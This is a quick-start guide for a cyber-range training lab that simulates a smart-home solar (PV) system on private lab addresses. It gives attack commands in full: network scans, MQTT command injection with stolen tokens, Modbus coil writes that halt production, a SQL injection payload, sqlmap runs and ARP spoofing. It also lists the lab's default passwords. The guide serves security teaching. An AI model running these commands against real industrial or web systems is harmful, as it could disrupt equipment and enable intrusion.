# Quick Start Guide - VM-Based Cyber Range

## Prerequisites

- Access to CyberRangeCZ Platform
- This repository pushed to the platform's Git instance
- Training Definition created from this repository

## Step 1: Create Training Instance

1. Log in to CyberRangeCZ Platform
2. Navigate to **Trainings**
3. Find "Smart Home PV - Cyber Range Challenge"
4. Click **Create Instance**
5. Wait for provisioning (10-15 minutes)

## Step 2: Access Your VMs

Once provisioning is complete, you'll have access to 4 VMs:

### Router VM (10.10.10.1)
- Handles network routing
- Usually no direct access needed

### Green Team VM (10.10.10.10)
```bash
ssh debian@<green-team-vm-ip>
# Password is defined via `variables.yml` (default: cyberrange123)
```

**Web UI:**
```
http://10.10.10.10/
```

**Services to check on the VM:**
```bash
cd /opt/smart-home-pv
docker compose ps
docker compose logs -f --tail=200
```

### Attacker VM (10.10.10.20) - Your Main Workspace
```bash
ssh attacker@<attacker-vm-ip>
Password: attacker
```

**Quick test:**
```bash
# Scan the network
nmap -sn 10.10.10.0/24

# Scan Green Team services
nmap -sV -p- 10.10.10.10

# Check tools
ls ~/tools/
```

### Blue Team VM (10.10.10.30)
Access ntopng via web browser:
```
http://<blue-team-vm-ip>:3000
# Or internally: http://10.10.10.30:3000
```

## Step 3: Start Attacking

### Challenge 1: Network Reconnaissance

From the **Attacker VM**:
```bash
# Discover open ports
nmap -sV 10.10.10.10

# Test MQTT broker
mosquitto_sub -h 10.10.10.10 -t 'pv/#' -v

# Test Modbus
python3 -c "from pymodbus.client import ModbusTcpClient; c=ModbusTcpClient('10.10.10.10',15002); print(c.connect())"

# Access web interface
curl http://10.10.10.10/
```

### Challenge 2: MQTT Hijacking

```bash
# Subscribe to status messages
mosquitto_sub -h 10.10.10.10 -t 'pv/status' -v

# Look for session tokens in messages

# Publish control command
mosquitto_pub -h 10.10.10.10 -t 'pv/control' -m '{"command":"HALT","token":"<stolen-token>"}'
```

### Challenge 3: Modbus Exploitation

```bash
cd ~/tools/
python3 attacker_modbus.py --target 10.10.10.10 --port 15002 --action stop
```

### Challenge 4: Web Application Attacks

```bash
# Test for SQL injection
curl -X POST http://10.10.10.10/api/admin/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' OR 1=1--","password":"anything"}'

# Test for XSS
# Navigate to the PV web UI and inject scripts
```

## Step 4: Monitor from Blue Team

Use **ntopng** to observe traffic patterns during attacks:

- Open: `http://10.10.10.30:3000`
- Default upstream credentials are typically `admin` / `admin` (if prompted)

Optional host-level capture on the Blue Team VM:
```bash
sudo tcpdump -i "$(ip route show default | awk '{print $5; exit}')" -nn -s0 -w /tmp/game-net.pcap
```

For application logs and PCAP artifacts, use the **Green Team VM** (Docker bind-mount):
```bash
ssh debian@10.10.10.10
ls -la /opt/smart-home-pv/logs/
```

## Common Issues

### Can't connect to VMs
```bash
# Check if VMs are running
# (Use platform console/dashboard)

# Verify network connectivity
ping 10.10.10.1  # Router
ping 10.10.10.10 # Green Team
ping 10.10.10.20 # Attacker
ping 10.10.10.30 # Blue Team
```

### Services not responding
```bash
# Green Team: check Docker stack
ssh debian@10.10.10.10
cd /opt/smart-home-pv
docker compose ps
docker compose logs -f --tail=200

# Blue Team: check ntopng + redis
ssh debian@10.10.10.30
sudo systemctl status ntopng
sudo systemctl status redis-server
```

### Web UI not loading
```bash
# Green Team: PV stack web UI should be on port 80
curl -i http://10.10.10.10/

# Blue Team: ntopng should be on port 3000
curl -i http://10.10.10.30:3000/
```

### Tools missing on Attacker VM
```bash
# Install additional tools
sudo apt update
sudo apt install <tool-name>

# Install Python packages
pip3 install <package-name>
```

## Training Flow

1. **Info Level** - Read scenario and architecture
2. **Access Level** - Connect to VMs (submit "start")
3. **Reconnaissance** - Discover services and vulnerabilities
4. **MQTT Hijacking** - Intercept and manipulate messages
5. **Modbus Exploitation** - Attack industrial protocol
6. **Session Hijacking** - Steal authentication tokens
7. **Web Attacks** - SQL injection and XSS

Each level has a flag to submit in the training platform.

## Attack Cheat Sheet

### Port Scanning
```bash
nmap -sV -p- 10.10.10.10
nmap -sU -p 1883 10.10.10.10  # UDP scan for MQTT
```

### MQTT Commands
```bash
# Subscribe
mosquitto_sub -h 10.10.10.10 -t 'pv/#' -v

# Publish
mosquitto_pub -h 10.10.10.10 -t 'pv/control' -m '{"command":"HALT"}'
```

### Modbus Commands
```python
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient('10.10.10.10', port=15002)
client.connect()

# Read holding registers
result = client.read_holding_registers(address=0, count=10)
print(result.registers)

# Write coil (stop production)
client.write_coil(1, True)
```

### Web Exploitation
```bash
# Directory enumeration
dirb http://10.10.10.10/

# SQL injection test
sqlmap -u "http://10.10.10.10/api/admin/login" --data="username=admin&password=test" --batch

# Nikto scan
nikto -h http://10.10.10.10
```

### ARP Spoofing
```bash
# Enable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# ARP spoof (victim is at 10.10.10.10)
sudo arpspoof -i eth0 -t 10.10.10.10 10.10.10.1
sudo arpspoof -i eth0 -t 10.10.10.1 10.10.10.10

# Capture traffic
sudo tcpdump -i eth0 -w capture.pcap
```

## Tips

1. **Start with reconnaissance** - Understand the network before attacking
2. **Read the documentation** - VM_ARCHITECTURE.md has detailed info
3. **Check logs** - Security events are logged on Blue Team VM
4. **Use the dashboard** - Real-time monitoring helps understand impact
5. **Save your work** - Document findings and successful exploits
6. **Be thorough** - Each attack vector teaches different techniques

## Getting Help

- **Documentation**: Check README.md, VM_ARCHITECTURE.md, MIGRATION_GUIDE.md
- **Logs**: View systemd logs on each VM
- **Platform**: Use CyberRangeCZ support if VMs don't provision
- **Training**: Review training.json for flag hints

## Success Criteria

You've successfully completed the cyber range when you:
- ✅ Accessed all three VMs
- ✅ Discovered all open ports and services
- ✅ Successfully hijacked MQTT messages
- ✅ Manipulated Modbus coils
- ✅ Exploited web application vulnerabilities
- ✅ Retrieved all flags

Good luck! 🚀
